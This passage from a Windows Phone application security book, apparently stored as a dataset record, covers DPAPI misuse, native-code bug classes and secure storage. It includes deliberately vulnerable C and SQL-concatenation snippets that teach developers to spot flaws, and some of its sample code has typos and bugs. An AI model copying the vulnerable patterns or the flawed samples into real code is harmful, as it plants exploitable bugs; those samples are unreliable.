dwFlags,\n_Out_ DATA_BLOB *pDataOut\n);\n.NET exposes interfaces for calling into DPAPI from C#, VB, and F# via the ProtectedData class. The\nProtectedData class exposes two methods: Protect() and Unprotect(). As expected, Protect() accepts plaintext\ndata and returns ciphertext data, and Unprotect() accepts ciphertext and returns plaintext data. DPAPI itself\ndoes not actually store data; it just encrypts (or decrypts) it and returns the data back to the caller.\nThe Protect() and Unprotect() APIs have the following prototypes on Windows Phone,\npublic static byte[] Protect(\nbyte[] userData,\nbyte[] optionalEntropy,\n)\nand:\npublic static byte[] Unprotect(\nbyte[] encryptedData,\nbyte[] optionalEntropy,\n)\nIn both cases, optionalEntropy is an optional parameter for specifying a secondary credential.\nDPAPI on the Windows desktop and server versions create per-user master cryptography keys so that apps\nrunning under one user on the system cannot decrypt data protected by an app running under another user\naccount.\nHowever, on Windows Phone devices, because all apps are running under the same user (PROTOCOLS), one\nmaster cryptography key is used for all third-party apps calling into DPAPI for encryption and decryption. The\nkeys are stored at the following path: C:\\Data\\Users\\DefApps\\APPDATA\\ROAMING\\MICROSOFT\\Protect\\<SID>.\nThe fact that all data protected by DPAPI on Windows Phone is encrypted using the same key for all apps\npresents a security problem. If an attacker on the device or malicious app is able to get access to a DPAPI-\nencrypted data blob, and the target app did not use an optionalEntropy parameter, he can recover the data\nsimply by calling into ProtectedData.Unprotect().\nFor example, consider an app on a device that encrypted data using DPAPI, like code such as the following. Note\nthe absence of the optionalEntropy parameter, where null is simply passed in instead:\nbyte[] encryptedData = ProtectedData.Protect(secretData, null);\nIf a malicious app on the device gained access to the outputted data, the following line of code would allow\ndecryption:\nbyte[] plaintextData = ProtectedData.Unprotect(encryptedData, null);\nThis scenario could clearly present a problem; disclosure of an encrypted blob could be decrypted by another app\non the device.\nThe solution to this problem is to use the optionalEntropy parameter when using ProtectedData.Protect(), so\nthat the app can pass in a secondary credential:\nbyte[] encryptedData = ProtectedData.Protect(secretData, secondarySecret);\nIf a malicious app on the device then attempted to decrypt the stolen data using ProtectedData.Unprotect(), it\nwould need to know secondarySecret to be successful.\nAs a result, you should always use the optionalEntropy parameter if you want to use DPAPI in your apps. Apps\nshould not, however, hard-code this value or otherwise store it on the device, because this would allow attackers\nwith filesystem access to attack the data somewhat easily. If you intend to use DPAPI in your apps, you should\nbase it on a secret passphrase known only by the app user—for example, the output of PBKDF2 on a password\nonly the user knows), and not based on hard-coded or determinable values.\nIn general, though, implementing cryptography using the standard APIs may be advisable instead, using a secret\nkey derivable from a user-known secret. (See Chapter 13 for our recommendations.) In addition to using\nstandard CryptoAPI calls to safely encrypt sensitive data for storage, we also give an example of how to use\nDPAPI with the optionalEntropy parameter.\nIdentifying Native Code Vulnerabilities\nApps running on Windows Phone 8 and above are capable of using native code (that is, C and C++ code). The\nuse of native code in Windows Phone apps is not especially common; nonetheless some apps call into native\ncode, generally for one or more of the following reasons:\nCode reuse/portability—If an app component (for example, a parser) has already been written in C++,\nreusing the codebase for a Windows Phone version of an app without having to rewrite it (for example, in\nC#) makes sense.\nGraphics—Many Windows Phone games (and other apps) need more direct access to graphics rendering\nusing Direct3D. This can only be done in native code (that is, C++), at the time of writing.\nPerformance—Some apps have performance-critical components, and so leverage native code to gain speed\nadvantages.\nThe three main ways of using native code in Windows Phone apps are:\nWriting a purely native app—For example, a C++ game for Windows Phone.\nBy writing a native Windows Phone Runtime Component (WinPRT) to call into your native\nlibrary—Internally, this uses PInvoke.\nBy using the[DllImport]attribute—This only works on Windows Phone 8.1, not Windows Phone 8.\nInternally, [DllImport] uses PInvoke.\nNo matter how an app runs native code, any memory protections that a managed language offered (that is, C#)\nare no longer there to protect the app. For example, if managed C# code calls into unmanaged C++ code, the app\nnow becomes vulnerable to memory corruption bugs (for example) in the same way that an app written in pure\nC++ would be.\nIf the source code to the native module is not available to you, you can extract the binary from the app’s Install\ndirectory, and then reverse engineer it using reverse engineering tools of your choice, although we recommend\nIDA Pro. The Hex-Rays decompiler plug-in for IDA Pro is relatively proficient at producing pseudo-code from a\nreversed native binary, so you may wish to have the Hex-Rays decompiler in your toolbox as well, since reading\npseudo-code is often much more efficient than reviewing ARM assembly, especially in complex modules.\nAn introduction to reverse engineering native ARM binaries is beyond the scope of this book, so we assume that\nif you have to reverse engineer native modules, that you are familiar with the methodologies involved in doing\nso.\nThe rest of this section covers how to spot native code vulnerabilities, and we also explain briefly each bug\nclassification and why it can be dangerous. This section is not an introduction to native code and its\nvulnerabilities. Instead, we assume you are already familiar with native code in general, and we mainly aim to\npoint out API use and coding patterns that may lead to native code vulnerabilities in the context of Windows\nPhone apps.\nStack Buffer Overflows\nStack-based buffer overflows occur when an application attempts to copy data into a fixed-length stack buffer\nwithout carrying out boundary checks; that is, without first ensuring that the destination buffer is large enough\nto house all the data being copied.\nNeedless to say, if the data chunk being copied is larger than the destination stack buffer, excess data will\noverrun the end of the stack buffer, and unintended data on the stack will be overwritten. Overwritten data may\ninclude pointers and program metadata, including saved return addresses. Having the ability to overwrite\nunintended stack data has made the possibility of taking control of program execution flow possible, in many\ncases allowing execution of attacker-controlled code. Exploit mitigation features have often made exploitation of\nstack overflow conditions somewhat more difficult in recent years, but many stack corruption vulnerabilities are\nstill exploitable, and all stack overflow bugs should be considered as such.\nQuite a number of APIs have been responsible for stack overflow vulnerabilities in the past and in the present.\nSome of these are:\nstrcpy()\ngets()\nsprint()\nstrcat()\nvsprintf()\nscanf()\nsscanf()\nmemcpy()\nbcopy()\nThis list is not an extensive list of all APIs that do not carry out bounds checking. When you are in doubt, a\nGoogle search of the API in question is likely to provide ample information about the safety of the function and\nboth how it can be abused and how it can be used safely.\nSpotting stack overflow vulnerabilities is often quite easy. In general, you’re looking for data copying operations\nthat do not carry out boundary checks on the destination buffer or copying operations that blindly trust an\nattacker-supplied length, and in both cases, the developer has not made sure that the destination buffer is large\nenough to hold the data being copied.\nFor example, the following code fragment is obviously vulnerable to stack corruption in its use of strcpy() to\ncopy into a buffer, destBuffer, that is declared on the program stack:\nchar destBuffer[32];\nchar attackerControlledData[200];\n[ ... ]\nint ret = ReadDataFromWire(&attackerControlledData[0]);\nstrcpy(destBuffer, attackerControlledData);\nBecause the strcpy() API does not carry out any boundary checks on the destination buffer, the API will\ncontinue copying from attackerControlledData until a NULL byte is encountered. Clearly, if the data in\nattackerControlledData is longer than 32 bytes, a stack overflow will occur as the bounds of destBuffer are\nbreached.\nThe following code, which uses sprintf(), would also be vulnerable to a similar stack overflow vulnerability,\nbecause sprintf() doesn’t perform bounds checking (unless a maximum number of characters is supplied with\nthe %s format specifier; that is, %32s):\nchar destBuffer[32];\nchar attackerControlledData[200];\n[ ... ]\nint ret = ReadDataFromWire(&attackerControlledData[0]);\nsprint(destBuffer, \"%s\", attackerControlledData);\nSome badly written code also accepts a user-supplied length and insecurely trusts it to use as a length, while\nparsing data:\nchar destBuffer[32];\n[ ... ]\nunsigned int len = ReadLengthFromBlob(attackerControlledData);\nunsigned char *ptr = ReadPayloadPosition(attackerControlledData);\nmemcpy(destBuffer, ptr, len);\nStack buffer overflows may also occur in hand-rolled copying loops; for example:\nchar destBuffer[32];\nunsigned char *ptr = &attackerControlledBuf[0];\nfor(int i = 0; *ptr; ptr++, i++) {\ndestBuffer[i] = *ptr++;\n}\nThe previous code is similar to a strcpy(). Bytes are copied from attackerControlledBuf until a NULL byte is\nfound. If the source buffer, attackerControlledBuf, does not contain any NULL bytes before 32 bytes have been\ncopied, a stack buffer overflow will occur.\nWe cover how to write native code securely in Chapter 13.\nHeap Buffer Overflows\nStandard heap overflow bugs are essentially analogous to stack-based overflows in their nature, except that they\nrelate to heap memory corruption, as the name suggests. Exploitation of heap overflows varies quite\nsignificantly for different memory allocators, but many exploitation techniques in the past and present involve\noverwriting pointers and other important data past the end of the destination buffer.\nAs with stack overflows, many of the same APIs play a role in causing heap overflow bugs:\nstrcpy()\ngets()\nsprint()\nstrcat()\nvsprintf()\nscanf()\nsscanf()\nmemcpy()\nbcopy()\nHand-rolled parsing and copying loops may also lead to heap corruption if the code does insufficient bounds\nchecking (or none at all), as demonstrated here:\nchar destBuffer[32];\nunsigned char *ptr = &attackerControlledBuf[0];\nfor(int i = 0; *ptr; ptr++, i++) {\ndestBuffer[i] = *ptr++;\n}\nYou can recognize heap memory use by an app calling into the following APIs:\nHeapAlloc()\nHeapReAlloc()\nmalloc()\nrealloc()\nNOTE\nThe preceding is not an exhaustive list of the APIs regular Windows offers for obtaining heap memory, but\nother APIs such as LocalAlloc() are not available to Windows Store apps, including those targeted for\nWindows Phone.\nTwo causes for heap overflows are common: unbounded copy operations, and integer overflows in size\ncalculations.\nIn the context of unbounded copies, here is a simple example of a heap overflow vulnerability:\nunsigned char *ptr = (unsigned char *)malloc(32);\nif(!ptr) {\nOutputError(\"memory allocation failed\\n\");\nreturn -1;\n}\nstrcpy(ptr, attackerSuppliedData);\nIf attackerSuppliedData is data under the attacker’s control, and it may be larger than 32 bytes, then a heap\ncorruption bug exists.\nOr, consider code that blindly trusts a parsed-out length field without validating it, due to bad parser design:\nunsigned char *buf = (unsigned char *)malloc(32);\n[ ... ]\nunsigned int len = ReadLengthFromBlob(attackerControlledData);\nunsigned char *ptr = ReadPayloadPosition(attackerControlledData);\nmemcpy(destBuffer, ptr, len);\nThe second common case is when size calculations for a heap buffer are vulnerable to integer overflows. For\nexample, consider the following code, which takes a data length from the user, and then adds 10 to it (for\nadditional payload copying later), which may cause the resulting value to wrap back to 0, meaning only a very\nsmall heap buffer is actually allocated:\nunsigned int len = ParseLenFromBlob(dataBlob);\nunsigned char *payload = GetPayloadPosition(dataBlob);\nunsigned char *ptr = malloc(len + 10); // calculation can wrap to 0!\nmemcpy(ptr, payload, len);\nIf len was within 10 of UINT_MAX (0xffffffff), the size used in the malloc() call would have wrapped back to\nzero and be a very small number. Obviously, the memcpy() call will then use the original value, in this case\noverwriting well beyond the bounds of the allocated memory chunk at ptr.\nWe cover some basics on how to write native code securely in Chapter 13.\nOther Integer-Handling Bugs\nWe already covered one common type of integer handling bug: integer overflows that can lead to heap or\ncorruption of other memory regions. Succinctly, memory corruption bugs resulting from integer overflows\nusually occur when careless arithmetic is carried out and an integer variable’s value is incremented past its\nmaximum value, thereby becoming either negative (for signed integers) or wrapping back past zero (for\nunsigned integers).\nFor example, consider the following code fragment:\nunsigned int len = ReadLengthFromBlob(blob);\nunsigned char *ptr = GetPayloadOffset(blob);\nunsigned char *buf = malloc(len + 10);\nmemcpy(buf, ptr, len);\nSuch bugs are quite common in native code, so you should never trust lengths from attacker-controllable data\nbefore first validating them for being safe and sane values. Writing arithmetic operations (and sometimes loops\nwhen variables of different sizes are used) that results in integer overflows is all too easy; always write such\ncode cautiously to ensure integers do not overflow or wrap.\nOther types of integer-handling bugs exist in addition to integer overflow of signed and unsigned integers (and\nthe short types). Among these are integer underflows and signedness errors.\nInteger Underflows\nInteger underflows work in reverse to integer overflow bugs; integer underflows occur when an integer is\ndecremented below zero.\nConsider the following code, which takes a user-supplied integer and subtracts a value from it, and then uses the\nresulting integer for a boundary check. The subtraction, in this hypothetical case, is for subtracting a header\nlength from a parsed-out size value.\n#define HEADER_LEN 16\n[ ... ]\nunsigned char buf[512];\nint len = GetLengthValueFromBlob(blob);\nunsigned char *ptr = GetDataPtrFromBlob(blob);\nif(len > sizeof(buf)) {\nOutputError(\"len too large for buf!\\n\");\nreturn -1;\n}\nlen -= HEADER_LEN;\nptr += HEADER_LEN;\nmemcpy(buf, ptr, len);\nThe code retrieves a length (as a signed integer) from an attacker-supplied data blob, validates that the length is\nno longer than 512, subtracts 16 from it, and then uses the length in a memcpy() call.\nHowever, in the len -= HEADER_LEN arithmetic operation, len may be decremented below 0, giving a very large\nnegative integer, in signed representations. However, in unsigned representations, as used in the memcpy() call,\nthe value will be represented as a very large unsigned value, resulting in a stack buffer overflow beyond buf’s\nbounds as memcpy() copies over a very large amount of data to buf. Again, as with overflows, you can avoid\nsituations like these by validating integers for safe values.\nInteger overflows also affect unsigned integers as well, but when decremented below 0, instead of becoming\nlarge negative values, the value becomes very large. When an unsigned integer is decremented below its\nminimum value (0), the value wraps backwards. For example, assuming that an integer had 31 as its value, and\nan application subtracted 32, from it, the value would become the integer’s largest value. In the context of an\nunsigned 32-bit integer, 0 - 1 = 0xffffffff, or 4294967295, sometimes referred as UINT_MAX, as per its ANSI\nmacro name.\nSignedness Errors\nSignedness bugs tend to occur when an integer is used in both signed and unsigned contexts, and confusion\ntherefore results. For example, consider the following code:\nchar buffer[512];\nint len = GetLenFromBlob(attackerControlledData);\nchar *ptr = GetPayloadPositionFromBlob(attackerControlledData);\nif(len > sizeof(buffer)) {\nOutputError(\"len is larger than buffer\\n\");\nreturn -1;\n}\nmemcpy(buffer, ptr, len);\nThe developer’s intentions are on point; len is checked for being larger than the size of buffer. However, if len is\nnegative, say -1, then the check will pass fine. However, when -1 is passed to memcpy(), it is interpreted as\n0xffffffff (UINT_MAX), because memcpy()’s third parameter is an unsigned integer, inevitably resulting in\nmemory corruption beyond buf’s boundary. In this situation, a memory corruption bug exists because len is\nbeing checked in a signed context, and then being used as an unsigned length.\nRepresenting length values as unsigned integers generally makes more sense, and would fix the bug in this\nhypothetical case. We discuss secure programming when dealing with integers in Chapter 13.\nFormat String Bugs\nFormat string functions accept a format string as a parameter, which describes to the API how the format\nparameters should be interpreted. For example, the following code simply prints the string in buf to the\nstandard output:\nchar buf[] = \"hello world\";\nprintf(\"%s\\n\", buf);\nThe %s format specifier informs the printf() API that the proceeding parameter is a pointer to a string.\nBesides printf(), other standard (and misusable) format string functions are:\nwsprintf()\nvsprintf()\nsprint()\nsnprintf()\nfprintf()\nasprintf()\nAttacker-controlled data should not be passed into a format string function as the format string itself, because\nthis may allow the attacker to manipulate and corrupt memory in the target app. So, for example, the following\nrepresents a bug,\nprintf(attackerControlledData);\nas does:\nsnprintf(buffer, sizeof(buffer)-1, attackerControlledData);\nFor exploitation, attackers may use the %n format specifier, which instructs (many) format string APIs to write\nthe currently written number of bytes to a specified address. With careful use of other format specifiers to\ncontrol the number of written bytes, %n can be used to write arbitrary bytes to arbitrary memory locations,\ntherefore allowing for controlled memory corruption exploits. As a consequence, any passing of attacker-\ncontrolled data to a format string function as the format string itself should be considered a serious security\nvulnerability.\nAvoiding format string bugs is easily done. Always use code like this,\nprintf(\"%s\", buf);\n. . .and never like this:\nprintf(buf);\nWe reiterate later that developers unfamiliar with classic native code bugs should review secure coding\nguidelines, and we provide links to resources to this end in the Chapter 13 section, “Avoiding Native Code Bugs”.\nArray Indexing Errors\nArray indexing errors occur when an attacker-supplied value is used as the index to an array, either on read or\nwrite operations. Such bugs are also sometimes called read access violations (AVs) and write AVs, because they\nhave the potential to cause access violations if unmapped memory addresses are written to or read from.\nFor example, the following is an example of a read indexing error,\nint someValue = buf[attackerControlledValue];\n. . .and a write index error:\nsomeBuffer[attackerControlledValue] = 0;\nIn general, write index errors tend to be more serious, because they often allow controlled memory corruption\nby writing to favorable locations beyond the bounds of the intended buffer. They could be considered a type of\nbuffer overflow.\nRead access violations have the potential to be used for memory disclosure in many cases. Both read and write\nbugs such as these can also be used to cause denial-of-service conditions via deliberate page faults by writing to\nor reading from unmapped memory addresses.\nBefore attacker-controlled values are used as indexes to arrays they should be strictly validated to ensure that\nthe value lies within the length of the allocated memory chunk.\nAlso take negative values into account, because writes to an array using a negative index may be considered a\ntype of buffer underflow. We reiterate this in Chapter 13.\nDenial-of-Service Bugs\nDenial-of-Service (DoS) bugs are less of a concern in mobile applications than in server apps, for example, but\nprevention of DoS bugs is good practice nonetheless.\nTwo general classes of DoS bugs are memory consumption bugs, and access violation bugs. We mentioned\naccess violation bugs in the previous section, wherein crashes due to unmapped memory reads could crash the\noffending process.\nOther access violation bugs are caused by NULL pointer dereferences. These bugs can happen in a number of\nfailure cases, but a common one is when a memory allocation fails and the resulting NULL pointer is not\nchecked and is dereferenced anyway. For example, consider a malloc() call that fails:\nunsigned char *ptr =\n(unsigned char *) malloc(largeAttackerControlledValue); // can return NULL\nIf ptr is not checked before it is dereferenced, a NULL pointer AV will happen, and the process will (most likely)\ncrash. In general, check returned pointers from APIs to ensure that NULL pointer dereferences don’t cause the\napp to crash.\nWhen you’re allocating memory based on attacker-controlled values, we recommend carrying out sanity checks.\nFailure to do this may result in large chunks of memory being allocated, and application performance being\ndegraded severely. For example, we would recommend against:\nunsigned char *ptr = (unsigned char *) malloc(largeAttackerControlledValue);\nInstead, code should check whether largeAttackerControlledValue is a sensible value before allowing the\nmemory allocation to take place.\nUnsafe C# Code\nThough not strictly native code, C# allows code to be designated as unsafe using the unsafe and fixed keywords.\nIn such code, pointers may be used, and security issues can arise in a fashion similar to many native software\nvulnerabilities. However, at the time of writing, Windows Phone 8 and 8.1 do not support the use of unsafe C#\ncode, and use of it will result in your app being rejected during the store vetting process.\nSummary\nWhen working to identify implementation issues in Windows Phone applications, the following bullet points\nmay be useful as a general checklist. The checklist is composed as a series of questions; answering “yes” to a\nquestion represents a potential security issue that should be further investigated to discover the real-world\nimpact:\nAre HTTP cache and cookies left undeleted when they’re no longer needed, thus representing a potential\nsensitive information leak (i.e., in the app’s INetCache and INetCookies directories)?\nDoes the app store sensitive data in files in cleartext (i.e., unencrypted)?\nDoes the app store sensitive data in any unencrypted databases?\nAre any insecure sources of randomness being used to generate security-sensitive data such as cryptographic\nkeys?\nDoes the app encrypt any sensitive data using bad cryptographic practices?\nIs there any native code misuse that could lead to classic native code vulnerabilities, such as memory\ncorruption?",
    "question": "What are the common implementation issues in Windows Phone applications that can lead to security vulnerabilities?",
    "summary": "This chapter discusses common security issues in Windows Phone apps, focusing on insecure data storage, such as storing sensitive information in plaintext or unencrypted databases. It highlights the risks of using weak cryptography, like DES or AES in ECB mode, and improper random number generation, which can lead to predictable keys. The chapter also covers vulnerabilities in native code, including buffer overflows and format string bugs, which can result in memory corruption or data leaks. Developers should ensure sensitive data is encrypted, use secure random number generators, and avoid storing keys or passwords in plaintext to prevent security risks."
  },
  {
    "start": 73,
    "end": 80,
    "text": "CHAPTER 13\nWriting Secure Windows Phone Applications\nHaving covered the security assessment of Windows Phone applications in some detail, this chapter discusses\nimportant coding practices for writing secure apps in the first place. Where appropriate, we’ve given code\nexamples for use in apps that generally need to be “secure.”\nGeneral Security Design Considerations\nYou should consider several points when designing and analyzing the security of an app. These can be\nsummarized as follows:\nEntry point analysis—What are the various ways, such as Interprocess Communications (IPC) endpoints\n(file handlers, protocol handlers), web communications, and downloading and parsing files, an attacker\ncould push data into your app?\nData validation—Does your app validate data before using it in potentially dangerous ways, or does it\nsimply trust it? Try to make as few assumptions about data integrity and safety as possible.\nData storage and handling—Does your app handle sensitive data? Does it store it? Sensitive data should\nnot be stored in the clear, but should instead be encrypted using a sensible crypto algorithm choice, secure\nkey generation, and cryptographic APIs.\nConsidering these general questions should make analyzing your app’s security and identifying areas that may\nrequire attention or further analysis easier to do.\nStoring and Encrypting Data Securely\nWhen applications deal with sensitive data and need to store it for later use (or transmit it across a network),\nstoring this data securely, using tried-and-tested crypto algorithms that are widely accepted as being secure, is\nimportant. The following subsections cover secure file storage and secure database storage, and we give\nexamples of how we recommend applying encryption to data being stored in databases and flat files.\nSafe Encryption Ciphers and Modes\nFor storing data (or transmitting it), we recommend the use of AES-128 (Advanced Encryption Standard) at\nminimum (though preferably AES-256), not in ECB mode. CBC mode is a sensible choice.\nWe also advise against using ciphers such as Data Encryption Standard (DES); sticking to the (at the time of\nwriting) industry-standard AES algorithm is sensible and recommended, and being required to use anything else\nis rare.\nHard-coded IVs should not be used with CBC; IVs are not supposed to be secret, but they should be a unique,\nper-app instance.\nKey Generation and Management\nCryptographic keys must be generated securely. This means that non- cryptographically secure APIs such as\nSystem.Random should not be used. For generating securely random keys, see the later section in this chapter,\n“Secure Random Number Generation.”\nTo generate keys based on a user-supplied secret, that is, a password, a recommendable choice is Password-\nBased Key Derivation Function 2 (PBKDF2). Basically, PBKDF2 generates a key from a password, which may be\nconsidered secure as long as the password is of sufficient length and the iteration count used is sufficiently high\n(10,000, for example).\n.NET provides an API for PBKDF2; namely Rfc2898DeriveBytes, for which you can find the full documentation\nat the following URL: http://msdn.microsoft.com/en-\nus/library/system.security.cryptography.rfc2898derivebytes%28v=vs.110%29.aspx.\nAfter keys have been generated, they should not be stored to the app’s local storage, because the compromise of\na device (with or without full disk encryption) could result in disclosure of the crypto key. If the crypto keys are\ngenerated randomly and stored to the device, they should be “wrapped” (that is, encrypted) with a PBKDF2-\ngenerated key derived from a user-known secret. If keys are generated directly from PBKDF2, no need exists to\nstore them.\nEncrypting Files\nAs we said in “Safe Encryption Ciphers and Modes”, above, when applications need to store sensitive data to the\ndevice as files, such data should be stored in encrypted form; we recommend using AES-256 in CBC mode.\nThe following code shows sample code for AES-256 CBC encrypt() and decrypt() functions, using the\nAesManaged API:\npublic byte[] encrypt(byte[] dataIn, byte[] cryptoKey, byte[] iv)\n{\nAesManaged aes = null;\nMemoryStream memoryStream = null;\nCryptoStream cryptoStream = null;\ntry\n{\naes = new AesManaged();\naes.Key = cryptoKey;\naes.IV = iv;\naes.KeySize = 256;\naes.Mode = CipherMode.CBC;\nmemoryStream = new MemoryStream();\ncryptoStream = new CryptoStream(memoryStream,\naes.CreateEncryptor(), CryptoStreamMode.Write);\nbyte[] data = Encoding.UTF8.GetBytes(dataToEncrypt);\ncryptoStream.Write(dataIn, 0, dataIn.Length);\ncryptoStream.FlushFinalBlock();\n// return encrypted data\nreturn memoryStream.ToArray();\n}\nfinally\n{\nif (cryptoStream != null)\ncryptoStream.Close();\nif (memoryStream != null)\nmemoryStream.Close();\nif (aes != null)\naes.Clear();\n}\n}\npublic string decrypt(byte[] dataIn, byte[] cryptoKey, byte[] iv)\n{\nAesManaged aes = null;\nMemoryStream memoryStream = null;\ntry\n{\naes = new AesManaged();\naes.Key = cryptoKey;\naes.IV = iv;\naes.KeySize = 256;\naes.Mode = CipherMode.CBC;\nmemoryStream = new MemoryStream();\nCryptoStream cryptoStream = new CryptoStream(memoryStream,\naes.CreateDecryptor(), CryptoStreamMode.Write);\n// decrypt Data\ncryptoStream.Write(dataIn, 0, dataIn.Length);\ncryptoStream.FlushFinalBlock();\nbyte[] decryptBytes = memoryStream.ToArray();\n//Dispose\nif (cryptoStream != null)\ncryptoStream.Dispose();\n//Retval\nreturn decryptBytes;\n}\nfinally\n{\nif (memoryStream != null)\nmemoryStream.Dispose();\nif (aes != null)\naes.Clear();\n}\n}\nEach of the functions accept input data, a key, and an IV, all as byte arrays, and return the data resulting from\nthe encryption or decryption as a byte array as well.\nAfter encryption by the encrypt() method, the resulting data can be stored using the standard file I/O APIs:\nStorageFolder or IsolatedStorage, and StreamReader.\nApplications may also use the standard Data Protection API (DPAPI) for data that will be stored locally. (If the\ndata is transmitted to a remote host, the host would not be able to decrypt it, because only the local device\nknows the key.) However, there are certain cases against using it for apps requiring high levels of security,\nwhich were outlined in the Chapter 12 section, “Data Protection API Misuse on Windows Phone.” You can find\nthe documentation for DPAPI at the following MSDN article: http://msdn.microsoft.com/en-\nus/library/windows/apps/hh487164%28v=vs.105%29.aspx.\nIf you use DPAPI, we highly recommend using the optionalEntropy parameter with a secret that only the app\nuser knows.\nEncrypting Databases\nTwo database types find common usage in Windows Phone applications: Windows Phone native databases and\nSQLite-based databases. We cover how to apply crypto to each of these main types.\nWindows Phone Local Databases\nCreating encrypted local databases in a Windows Phone applications is fortunately very easy; you may simply\nuse the Password property in your database’s connection string:\nstring connectionString = \"Data\nSource='isostore:/ToDo.sdf';Password='myDatabasePassword'\";\nDevelopers should not, of course, hard-code the password; secure credential and key management principles\nshould be adhered to. Applying database crypto in this way results in the database’s being encrypted via AES-128\nin CBC mode. The key used is the SHA-256 hash of the password specified in the connection string’s Password\nproperty.\nA detailed discussion of Windows Phone local databases is beyond the scope of this section, but a short\nintroduction appears in Chapter 12.\nYou can also consult MSDN’s introduction to local databases for a general example on implementing local\ndatabase storage: http://msdn.microsoft.com/en-us/library/windows/apps/hh202860%28v=vs.105%29.aspx.\nThe documentation at the previous URL also provides information on applying crypto to a database, as we’ve\nalso done in this short section (http://msdn .microsoft.com/en-\nus/library/windows/apps/hh202860%28v=vs.105%29.aspx#BKMK_DatabaseSecurity).\nSQLite-Based Databases\nThe two main options for applying crypto to databases that are SQLite in nature are SQLite’s SQLite Encryption\nExtension (SEE) and SQLCipher.\nEach of these options is almost as simple to use as the standard Windows Phone SQLite options, although SEE\nrequires some setup, including compilation of the distribution.\nFor general information on obtaining and using encrypted SQLite-like databases in your applications, consult\nSQLCipher’s or SEE’s documentation at https://www.zetetic.net/sqlcipher/ and\nhttps://www.sqlite.org/see/doc/trunk/www/readme.wiki.\nSecure Random Number Generation\nWe’ve looked at how random numbers can be badly generated in some detail in Chapter 12’s section, “Insecure\nRandom Number Generation.” In particular, we focused on how the .NET non-cryptographically secure random\nnumber generator—System.Random—may introduce security bugs into apps that are supposed to be secure.\nIn the context of mobile applications, arguably the most common use case for random number generation is in\nthe generation of crypto keys. In modern mobile computing, mobile apps often rely on data held in an app’s\nisolated storage as being secure, and as such, recovery of this data by attackers may potentially have very serious\nconsequences.\nSystem.Random is not fit for generating cryptographically secure crypto keys. This short section gives positive\nexamples showing how the RNGCryptoServiceProvider API can instead be used for generating crypto keys. Of\ncourse, the same method may be used for generating random data for any other purposes.\nRNGCryptoServiceProvider does not have the same problems with predictability of outputted data that\nSystem.Random does. Fortunately, as well, using RNGCryptoServiceProvider is straightforward. Consider the\nfollowing example for generating a 256-bit crypto key:\nRNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();\nbyte[] cryptoKey = new byte[32];\nrng.GetBytes(cryptoKey);\n// cryptoKey now holds 32 random bytes!\nAlthough the RNGCryptoServiceProvider API is significantly slower (some benchmarks estimate around 300\ntimes slower), in the context of mobile applications, generation of crypto keys and other random data is\ngenerally a rare occurrence, hence the cryptographic security of the outputted data versus the speed of its\ngeneration is a trade-off that is absolutely worth it for apps that need to be secure.\nThe full documentation for the RNGCryptoServiceProvider class appears on the API’s MSDN page at\nhttp://msdn.microsoft.com/en-us/library/system\n.security.cryptography.rngcryptoserviceprovider%28v=vs.110%29.aspx.\nSecuring Data in Memory and Wiping Memory\nWhen you’re handling sensitive data in memory, being able to wipe the memory when it is no longer\nimmediately needed is sometimes desirable. Having sensitive memory secured is also desirable to lessen the\nchances of memory analysis attacks from gaining access to sensitive data in a process’s memory space. An\nexample of such a piece of data would be a crypto key.\nWe advise that crypto keys be wiped from memory when they are not needed. Example scenarios for when to\nwipe a crypto key include:\nWhen the app is placed into the background\nWhen the app’s custom screen lock is applied\nWhen the key is not needed for the time being\nIn such cases, overwriting all elements of the byte array holding the crypto key is recommended. For example:\nfor(int i = 0; i < 32; i++) {\ncryptoKey[i] = 0;\n}\nOf course, most Windows Phone applications are running in a runtime, and in theory the runtime might create\nadditional copies of any objects, so clearing a byte array to rid the process of the data should be considered a\n“best effort” attempt.\nOne possible solution to this problem is to implement all crypto code as a native library and call into it from\nyour C# code. The native library would deal with all crypto-related tasks, and then memset_s()crypto keys and\nother sensitive data after its tasks are complete. (The _s() prevents compiler optimization from removing the\nmemset() call.) The following URL provides a sample project for calling into a native library (written in C++) via\nmanaged C# code: https://code.msdn.microsoft.com/windowsapps/Windows-Phone-8-JumpStart-108965b9.\nIf, however, your app is actually written as a native app, using memset_s() on your sensitive crypto keys should\nbe sufficient to ensure their deletion from your process’s memory space.\nBear in mind that string objects are immutable, hence after values are held in these objects, the value cannot be\ncleared; the disposal of the object’s contents is at the discretion of the CLR’s garbage collector. Unfortunately,\nno secure equivalent, such as SecureString, is currently supported on the Windows Phone platforms. Wherever\npossible, then, developers should attempt to use byte[] and char[] arrays instead of strings, for storing\nparticularly sensitive data such as passwords.\nRemoving sensitive data from the process’s memory is a best-effort attempt on the developer’s part. However,\nthe object’s immediate removal is not guaranteed (that is, via garbage collection). When developers must use\nstring objects and want to have the content’s garbage collected and removed, they may consider setting the\nreference to null, at which point they would call the garbage collector manually:\ns = null; // set ref to null\nGC.Collect(); // invoke GC\nNote, however, that this does not guarantee that the object’s contents will be disposed of immediately, but it’s\nabout the best a developer can do when using immutable objects.\nAvoiding SQLite Injection\nWhen apps use Windows Phone local databases for storing their data in database format, there is no risk of SQL\ninjection, because developers interact with the database via a LINQ-to-SQL layer, rather than talking to the\ndatabase directly using SQL queries.\nThere may be risk of SQL injection, however, when SQLite databases are used; SQL injection is possible in\nWindows Phone apps when developers use SQLite (such as via sqlite-net) or SQLCipher. The following APIs are\nprone to being misused for SQL injection attacks:\ndb.CreateCommand()\ndb.Execute()\ndb.ExecuteScalar()\ndb.Query()\ndb.Query<T>()\ndb.DeferredQuery()\ndb.DeferredQuery<T>()\nWhen developers want to execute raw queries instead of using abstraction layers to handle SQL statement\nconstruction, SQL injection bugs occur due to direct inclusion of attacker-controlled data into queries, instead of\nusing parameterization for construction of the query.\nFor example, the following code fragment is vulnerable to SQL injection, assuming an attacker is in control of\nthe attackerInput string:\nvar db = new SQLiteConnection(Path.Combine(ApplicationData.Current.LocalFolder.\nPath,\n\"test.db\"));\n[ ... ]\nSQLiteCommand cmd = db.CreateCommand(\"select * from Stock where Symbol = '\" +\nattackerInput + \"'\");\n// get all stock items with name in question\nList<Stock> stockList = cmd.ExecuteQuery<Stock>();\nIn the preceding snippet, the attackerInput string is included into the raw query by concatenation, thus any\ndata in the attackerInput string simply becomes part of the query itself, allowing the attacker to change the\nstructure of the actual query.\nDevelopers needing to construct raw queries for operations on their SQLite database should use the API’s\nparameterization features. The following code snippet shows how to construct the same query as earlier,\nwithout being vulnerable to SQL injection:\nvar db = new 